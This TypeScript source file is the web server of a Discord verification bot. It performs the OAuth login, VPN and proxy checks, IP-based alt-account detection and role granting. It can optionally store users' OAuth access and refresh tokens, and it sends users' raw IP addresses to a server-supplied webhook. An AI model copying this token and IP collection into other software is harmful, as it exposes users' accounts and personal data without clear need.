import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import { CONFIG } from '../config';
import { prisma } from '../database';
import fetch from 'node-fetch';

export class WebServer {
  private app: express.Application;
  private bot: any;

  constructor(bot: any) {
    this.app = express();
    this.bot = bot;
    this.setupMiddleware();
    this.setupRoutes();
  }

  private setupMiddleware() {
    // Config trust proxy SPECIFICALLY for cloudflare
    this.app.set('trust proxy', ['loopback', 'linklocal', 'uniquelocal', 
      '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22',
      '141.101.64.0/18', '108.162.192.0/18', '190.93.240.0/20', '188.114.96.0/20',
      '197.234.240.0/22', '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
      '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22'
    ]);

    this.app.use(helmet({
      contentSecurityPolicy: false,
    }));
    
    this.app.use(cors({
      origin: CONFIG.server.baseUrl,
      credentials: true,
    }));

    const limiter = rateLimit({
      windowMs: 15 * 60 * 1000,
      max: 100,
      message: 'Too many requests from this ip, please try again later',
      keyGenerator: (req) => this.getClientIP(req),
    });
    this.app.use(limiter);

    const verifyLimiter = rateLimit({
      windowMs: 5 * 60 * 1000,
      max: 5,
      message: 'Too many verification attempts, you have been rate limited; Please wait and try again after 4-5 minutes. Please contact support if you continue to have issues.',
      keyGenerator: (req) => this.getClientIP(req),
    });
    this.app.use('/verify', verifyLimiter);

    this.app.use(express.json());
    this.app.use(express.urlencoded({ extended: true }));
  }

  private setupRoutes() {
    this.app.get('/verify', async (req, res) => {
      const { code, state } = req.query;

      if (!code || !state) {
        return res.send(this.renderErrorPage('Invalid verification request.'));
      }

      try {
        const session = await prisma.verificationSession.findUnique({
          where: { state: state as string },
        });

        if (!session) {
          return res.send(this.renderErrorPage('Invalid or expired verification session.'));
        }

        if (session.expiresAt < new Date()) {
          return res.send(this.renderErrorPage('Verification session has expired.'));
        }

        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            client_id: CONFIG.discord.clientId,
            client_secret: CONFIG.discord.clientSecret,
            grant_type: 'authorization_code',
            code: code as string,
            redirect_uri: CONFIG.server.baseUrl + '/verify',
          }),
        });

        const tokenData = await tokenResponse.json() as any;

        const userResponse = await fetch('https://discord.com/api/users/@me', {
          headers: {
            Authorization: `Bearer ${tokenData.access_token}`,
          },
        });

        const userData = await userResponse.json() as any;
        const discordId = userData.id;

        const ipAddress = this.getClientIP(req);

        if (CONFIG.logTokens) {
          await prisma.discordToken.create({
            data: {
              discordId,
              accessToken: tokenData.access_token,
              tokenType: tokenData.token_type,
              refreshToken: tokenData.refresh_token,
              expiresIn: tokenData.expires_in,
              scope: tokenData.scope,
              ipAddress,
              guildId: session.guildId,
            },
          });
        }
        
        const result = await this.processVerification(discordId, ipAddress, session);
        
        await this.updateMsg(session, discordId, result);
        
        await prisma.verificationSession.delete({
          where: { state: state as string },
        });

        return res.send(this.renderResultPage(result));

      } catch (error) {
        console.error('error during verification', error);
        return res.send(this.renderErrorPage('An error occurred during verification.'));
      }
    });

    this.app.get('/health', (req, res) => {
      res.json({ status: 'ok', timestamp: new Date().toISOString() });
    });
  }

  private async processVerification(discordId: string, ipAddress: string, session: any) {
    try {
      const ipCheckResult = await this.checkIP(ipAddress);
      if (ipCheckResult.isProxy) {
        await this.logVerificationAttempt(discordId, ipAddress, session.guildId, session.roleId, false, 'proxy');
        await this.logToWebhook(session, discordId, ipAddress, false, 'Verification failed: VPN/Proxy detected');
        return {
          success: false,
          reason: 'proxy',
          message: 'Verification failed: VPN/Proxy detected. Please disable your VPN and try again.',
        };
      }

      const existingUser = await prisma.user.findFirst({
        where: {
          ipAddress,
          guildId: session.guildId,
          roleId: session.roleId,
          NOT: { discordId },
        },
      });

      if (existingUser) {
        await this.logVerificationAttempt(discordId, ipAddress, session.guildId, session.roleId, false, 'alt_account');
        await this.logToWebhook(session, discordId, ipAddress, false, `Verification failed: Alt account detected. Original account: ${existingUser.discordId}`);
        return {
          success: false,
          reason: 'alt_account',
          message: 'We believe that you have already verified on another Discord account. If you think we made a mistake, make a ticket and explain your situation.',
        };
      }

      const guild = this.bot.client.guilds.cache.get(session.guildId);
      if (guild) {
        try {
          const member = await guild.members.fetch(discordId);
          if (member && member.roles.cache.has(session.roleId)) {
            return {
              success: true,
              reason: 'already_had_role',
              message: 'You already have this role, so nothing was changed.',
            };
          }
        } catch (error) {
          // could not check existing roles for x user
        }
      }

      const roleGranted = await this.grantRole(discordId, session.guildId, session.roleId);
      
      if (!roleGranted) {
        await this.logVerificationAttempt(discordId, ipAddress, session.guildId, session.roleId, false, 'role_error');
        await this.logToWebhook(session, discordId, ipAddress, false, 'Verification failed: Unable to grant role');
        return {
          success: false,
          reason: 'error',
          message: 'Verification failed: Unable to grant role. Please contact an admin!',
        };
      }
      
      const existingUserRecord = await prisma.user.findUnique({
        where: {
          discordId_guildId_roleId: {
            discordId: discordId,
            guildId: session.guildId,
            roleId: session.roleId,
          },
        },
      });

      if (existingUserRecord) {
        await prisma.user.update({
          where: {
            discordId_guildId_roleId: {
              discordId: discordId,
              guildId: session.guildId,
              roleId: session.roleId,
            },
          },
          data: {
            ipAddress,
            verifiedAt: new Date(),
            updatedAt: new Date(),
          },
        });
      } else {
        await prisma.user.create({
          data: {
            discordId,
            ipAddress,
            guildId: session.guildId,
            roleId: session.roleId,
          },
        });
      }

      await this.logVerificationAttempt(discordId, ipAddress, session.guildId, session.roleId, true, 'success');
      await this.logToWebhook(session, discordId, ipAddress, true, 'Successfully verified');

      return {
        success: true,
        reason: 'success',
        message: 'You have been given access to whatever role you were verifying for.',
      };

    } catch (error) {
      console.error('Error processing verification:', error);
      return {
        success: false,
        reason: 'error',
        message: 'Oh no! An error happened during the verification process. Please try again.',
      };
    }
  }

  private async checkIP(ipAddress: string) {
    try {
      const response = await fetch(`https://api.ipapi.is/?q=${ipAddress}&key=${CONFIG.ipapi.apiKey}`);
      const data = await response.json() as any;
      
      const isProxy = data.is_proxy === true || 
                     data.is_vpn === true || 
                     data.is_datacenter === true ||
                     data.is_tor === true ||
                     data.is_abuser === true;
      
      return {
        isProxy,
        country: data.location?.country || 'Unknown',
        city: data.location?.city || 'Unknown',
        isp: data.company?.name || 'Unknown',
        org: data.asn?.org || 'Unknown',
        hosting: data.is_datacenter || false,
        mobile: data.is_mobile || false
      };
    } catch (error) {
      console.error('err checking IP:', error);
      return { 
        isProxy: true,
        country: 'Unknown',
        city: 'Unknown',
        isp: 'Unknown',
        org: 'Unknown',
        hosting: false,
        mobile: false
      };
    }
  }

  private async grantRole(discordId: string, guildId: string, roleId: string) {
    try {
      const guild = this.bot.client.guilds.cache.get(guildId);
      if (!guild) {
        console.error('server not found', guildId);
        return false;
      }

      const member = await guild.members.fetch(discordId);
      if (!member) {
        console.error('member not found', discordId);
        return false;
      }

      const role = guild.roles.cache.get(roleId);
      if (!role) {
        console.error('role not found', roleId);
        return false;
      }

      if (member.roles.cache.has(roleId)) {
        console.log('user already has role:', discordId, roleId);
        return true;
      }

      await member.roles.add(role);
      console.log('role granted to user', discordId, role.name);
      return true;
    } catch (error) {
      console.error('err granting role:', error);
      return false;
    }
  }

  private async logVerificationAttempt(
    discordId: string, 
    ipAddress: string, 
    guildId: string, 
    roleId: string,
    success: boolean, 
    reason: string
  ) {
    try {
      await prisma.verificationAttempt.create({
        data: {
          discordId,
          ipAddress,
          guildId,
          roleId,
          success,
          reason,
        },
      });
    } catch (error) {
      console.error('err logging attempt:', error);
    }
  }

  private async logToWebhook(session: any, discordId: string, ipAddress: string, success: boolean, message: string) {
    try {
      const webhookUrl = session.webhookUrl;
      if (!webhookUrl) return;

      const user = await this.bot.client.users.fetch(discordId);
      const embed = {
        title: success ? 'Verification Successful' : 'Verification Failed',
        description: message,
        fields: [
          { name: 'User', value: `${user.tag} (${discordId})`, inline: true },
          { name: 'IP', value: ipAddress, inline: true },
          { name: 'Time', value: new Date().toISOString(), inline: true },
        ],
        color: success ? 0x00ff00 : 0xff0000,
        timestamp: new Date().toISOString(),
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          embeds: [embed],
        }),
      });
    } catch (error) {
      console.error('err logging to webhook:', error);
    }
  }

  private async updateMsg(session: any, discordId: string, result: any) {
    try {
      let content: string;
      if (result.success || result.reason === 'already_had_role') {
        if (result.reason === 'already_had_role') {
          content = `**Already Verified!**\n\nYou already have this role.`;
        } else {
          content = `**Verification Successful!**\n\nYou have been successfully verified and granted the required role.`;
        }
      } else {
        let failureMessage = "**Verification Failed**\n\n";
        switch (result.reason) {
          case 'proxy':
            failureMessage += "VPN/Proxy detected. Please disable your VPN and try again.";
            break;
          case 'alt_account':
            failureMessage += "We believe that you have already verified on another Discord account. If you think we made a mistake, make a ticket and explain your situation.";
            break;
          default:
            failureMessage += "An error occurred during verification. Please retry or contact support.";
        }
        content = failureMessage;
      }

      this.bot.pendingMessageUpdates = this.bot.pendingMessageUpdates || new Map();
      this.bot.pendingMessageUpdates.set(discordId, {
        content,
        success: result.success,
        timestamp: Date.now()
      });
    } catch (error) {
      console.error('Error updating Discord message:', error);
    }
  }

  private getClientIP(req: express.Request): string {
    const cfConnectingIP = req.headers['cf-connecting-ip'] as string;
    if (cfConnectingIP) {
      return cfConnectingIP;
    }
    
    const xForwardedFor = req.headers['x-forwarded-for'] as string;
    if (xForwardedFor) {
      return xForwardedFor.split(',')[0].trim();
    }
    
    return req.connection.remoteAddress ||
           req.socket.remoteAddress ||
           '127.0.0.1';
  }

  private renderErrorPage(message: string): string {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Failed</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            overflow-x: hidden;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 24px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            animation: fadeInUp 0.6s ease-out;
        }
        .icon-container {
            animation: float 3s ease-in-out infinite, fadeInUp 0.8s ease-out;
        }
        .title {
            animation: fadeInUp 0.8s ease-out 0.2s backwards;
        }
        .message {
            animation: fadeInUp 0.8s ease-out 0.4s backwards;
        }
        .footer {
            animation: fadeInUp 0.8s ease-out 0.6s backwards;
        }
        .support-btn {
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(5px);
        }
        .support-btn:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.3);
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <div class="card max-w-lg w-full p-8 md:p-12 text-center">
        <div class="icon-container mx-auto flex items-center justify-center h-20 w-20 md:h-24 md:w-24 rounded-full bg-gradient-to-br from-red-400 to-red-600 mb-6 shadow-lg">
            <svg class="h-10 w-10 md:h-12 md:w-12 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
        </div>
        <h1 class="title text-4xl md:text-5xl font-bold text-white mb-6 drop-shadow-lg">Verification Failed</h1>
        <p class="message text-lg md:text-xl text-white/90 leading-relaxed mb-8">${message}</p>
        <a href="https://multichat.cloud/support" target="_blank" rel="noopener noreferrer" class="support-btn inline-flex items-center gap-2 px-6 py-3 rounded-full text-white font-semibold border border-white/30">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z"></path>
            </svg>
            Contact Support
        </a>
    </div>
    <div class="footer mt-8 text-center">
        <p class="text-white/70 text-sm">Need help? <a href="https://multichat.cloud/support" class="text-white font-semibold hover:underline" target="_blank" rel="noopener noreferrer">Visit our support page</a></p>
    </div>
</body>
</html>`;
  }

  private renderResultPage(result: any): string {
    const isSuccess = result.success;
    
    let gradientColors = 'linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%)';
    let iconGradient = 'from-red-400 to-red-600';
    let icon = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M6 18L18 6M6 6l12 12" />';
    let title = 'Verification Failed';
    let emoji = '❌';

    if (isSuccess) {
      gradientColors = 'linear-gradient(135deg, #11998e 0%, #38ef7d 100%)';
      iconGradient = 'from-green-400 to-emerald-600';
      icon = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7" />';
      title = 'Verification Successful';
      emoji = '✅';
    } else if (result.reason === 'alt_account') {
      gradientColors = 'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)';
      iconGradient = 'from-orange-400 to-red-600';
      icon = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" />';
      title = 'Account Already Verified';
      emoji = '👤';
    } else if (result.reason === 'proxy') {
      gradientColors = 'linear-gradient(135deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%)';
      iconGradient = 'from-purple-400 to-blue-600';
      icon = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />';
      title = 'VPN/Proxy Detected';
      emoji = '🛡️';
    }

    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${title}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: ${gradientColors};
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            overflow-x: hidden;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(5deg); }
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        @keyframes scaleIn {
            from {
                opacity: 0;
                transform: scale(0.8);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        @keyframes shimmer {
            0% { background-position: -1000px 0; }
            100% { background-position: 1000px 0; }
        }
        .card {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(20px);
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1) inset;
            animation: fadeInUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        .icon-container {
            animation: float 4s ease-in-out infinite, scaleIn 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
            filter: drop-shadow(0 10px 30px rgba(0, 0, 0, 0.3));
        }
        .title {
            animation: fadeInUp 0.8s ease-out 0.2s backwards;
            text-shadow: 0 2px 20px rgba(0, 0, 0, 0.2);
        }
        .message {
            animation: fadeInUp 0.8s ease-out 0.4s backwards;
        }
        .footer {
            animation: fadeInUp 0.8s ease-out 0.6s backwards;
        }
        .support-btn {
            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            background: rgba(255, 255, 255, 0.25);
            backdrop-filter: blur(10px);
            animation: fadeInUp 0.8s ease-out 0.5s backwards;
        }
        .support-btn:hover {
            background: rgba(255, 255, 255, 0.35);
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 10px 30px rgba(255, 255, 255, 0.4);
        }
        .divider {
            animation: fadeInUp 0.8s ease-out 0.45s backwards;
        }
        .emoji {
            font-size: 3rem;
            animation: scaleIn 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s backwards;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <div class="card max-w-2xl w-full p-8 md:p-14 text-center relative">
        <div class="emoji mb-4">${emoji}</div>
        <div class="icon-container mx-auto flex items-center justify-center h-24 w-24 md:h-28 md:w-28 rounded-full bg-gradient-to-br ${iconGradient} mb-8 shadow-2xl">
            <svg class="h-12 w-12 md:h-14 md:w-14 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                ${icon}
            </svg>
        </div>
        <h1 class="title text-4xl md:text-6xl font-black text-white mb-8 tracking-tight">${title}</h1>
        <div class="divider h-1 w-24 bg-white/40 rounded-full mx-auto mb-8"></div>
        <p class="message text-lg md:text-xl text-white/95 leading-relaxed mb-10 max-w-xl mx-auto font-medium">${result.message}</p>
        <a href="https://multichat.cloud/support" target="_blank" rel="noopener noreferrer" class="support-btn inline-flex items-center gap-3 px-8 py-4 rounded-full text-white font-bold text-lg border-2 border-white/40 shadow-xl">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z"></path>
            </svg>
            Contact Support
        </a>
    </div>
    <div class="footer mt-10 text-center">
        <p class="text-white/80 text-base font-medium">Need assistance? <a href="https://multichat.cloud/support" class="text-white font-bold hover:underline decoration-2 underline-offset-4" target="_blank" rel="noopener noreferrer">Visit our support page</a></p>
    </div>
</body>
</html>`;
  }

  public start() {
    this.app.listen(CONFIG.server.port, CONFIG.server.host, () => {
      console.log(`frontend for VeeriBot started on ${CONFIG.server.baseUrl}`);
    });
  }
}
